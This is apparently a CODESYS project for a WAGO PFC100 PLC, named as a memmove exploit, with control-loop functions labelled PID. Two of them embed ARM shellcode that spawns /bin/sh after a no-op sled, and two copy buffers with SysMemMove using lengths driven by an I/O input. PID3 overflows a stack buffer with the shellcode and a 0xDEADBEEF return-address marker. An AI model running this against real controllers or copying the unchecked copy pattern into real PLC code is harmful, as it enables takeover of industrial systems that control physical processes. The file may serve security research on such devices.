(* CODESYS project memmove_exploit.ecp

Project tree, tasks and I/O mapping:
  PFC100_2ETH_ECO_1 : 750-8100 PFC100 CS 2ETH ECO, WAGO, order no. 0750-8100, version 5.9.1.16
    application Application
      libraries: 
      task PLC_Task (cyclic, interval 300 ms, priority 14) calls PLC_PRG
      program PLC_PRG [ST]
      function PID [ST]
      global variables GVL
      function PID2 [ST]
      function PID3 [ST]
    Kbus : Kbus, WAGO, version 1.4.0.1
        unmapped channels: K-BUS diagnostics
      _2_DI_Generic : 075x-2DI, WAGO, order no. 075x-2DI, version 0.0.0.13
          settings: K-BUS Module slot index = 1
          unmapped channels: _IN
      _2_DO_Generic : 075x-2DO, WAGO, order no. 075x-2DO, version 0.0.0.13
          settings: K-BUS Module slot index = 2
          unmapped channels: _OUT
      _4AI_0_10_VDC_SE : 0750-0459, WAGO, order no. 0750-0459, version 0.0.0.13
          settings: K-BUS Module slot index = 3
          unmapped channels: _IW 1, _IW 2, _IW 3, _IW 4
      _2AO_0_10_VDC : 0750-0550, WAGO, order no. 0750-0550, version 0.0.0.9
          settings: K-BUS Module slot index = 4
          unmapped channels: _QW 1, _QW 2
    MODBUS
      MODBUS : MODBUS, WAGO, order no. n/a, version 1.1.1.13
    Serial
  libraries: StringUtils, 3.5.14.0 (System); WagoTypesModule_75x_564, 0.0.0.2 (WAGO); SysStr23, 3.5.13.0 (System); SysMem, 3.5.12.0 (System); BASIC, 3.3.4.0 (OSCAT)
  text list GlobalTextList
*)

// PFC100_2ETH_ECO_1/Application/GVL
{attribute 'qualified_only'}
VAR_GLOBAL
	payload : STRING(256);
	buffer: STRING(256);
	pbuf: DWORD;
	buf_ptr: DWORD;
	temp: WORD :=92;
	setpoint: WORD := 565;
	buf: WORD :=20;
	scaler: WORD :=0;
END_VAR

// PFC100_2ETH_ECO_1/Application/PLC_PRG
PROGRAM PLC_PRG
VAR
	input1 AT %IW1:WORD;
	output1 AT %QW1:WORD;
	in_addr: DWORD;
END_VAR




in_addr := ADR(input1);
output1 := PID2(input1);
GVL.scaler := 33*input1;

END_PROGRAM

// PFC100_2ETH_ECO_1/Application/PID2
FUNCTION PID2 : WORD
VAR_INPUT
	input1: WORD;
END_VAR

VAR
	locbuffer: STRING(256);
	locbuffer2: STRING(64);
	buf_addr: DWORD;
	buf_addr2: DWORD;
END_VAR

locbuffer := '$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$01$01$01$00$12$01$30$8f$e2$13$ff$2f$e1$02$a0$49$40$52$40$c2$71$0b$27$01$df$2f$62$69$6e$2f$73$68$78';
locbuffer2 := 'bbbb';
buf_addr := ADR(locbuffer);
buf_addr2 := ADR(locbuffer2);

GVL.setpoint := 12;
PID2 := 1638;

END_FUNCTION

// PFC100_2ETH_ECO_1/Application/PID
FUNCTION PID : WORD
VAR_INPUT
	input1: WORD;
END_VAR

VAR
	locbuffer: WSTRING(64);
	locbuffer2: WSTRING(64);
	buf_addr: DWORD;
	buf_addr2: DWORD;
	beef: UDINT;
	cafe: UDINT;
	satan: WORD :=0;
END_VAR


locbuffer := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
locbuffer2 := "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
buf_addr := ADR(locbuffer);
buf_addr2 := ADR(locbuffer2);
beef := 16#DEADBEEF;
cafe := 16#CAFEDEAF;

GVL.temp := input1/65532 +GVL.temp+5;

SysMemMove(buf_addr, buf_addr2, GVL.temp);

PID := (GVL.temp/10)*755;

END_FUNCTION

// PFC100_2ETH_ECO_1/Application/PID3
FUNCTION PID3 : WORD
VAR_INPUT
	input1: WORD;
END_VAR

VAR
	locbuffer: STRING(256);
	locbuffer2: STRING(64);
	buf_addr: DWORD;
	buf_addr2: DWORD;
END_VAR

locbuffer := '$00$00$00$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$e1$a0$10$01$01$01$01$00$12$01$30$8f$e2$13$ff$2f$e1$02$a0$49$40$52$40$c2$71$0b$27$01$df$2f$62$69$6e$2f$73$68$78$ef$be$ad$de';
locbuffer2 := 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
buf_addr := ADR(locbuffer);
buf_addr2 := ADR(locbuffer2);

GVL.temp := input1 + 1;

SysMemMove(buf_addr2, buf_addr, GVL.temp);

GVL.setpoint := GVL.buf;
PID3 := 1 + input1;

END_FUNCTION
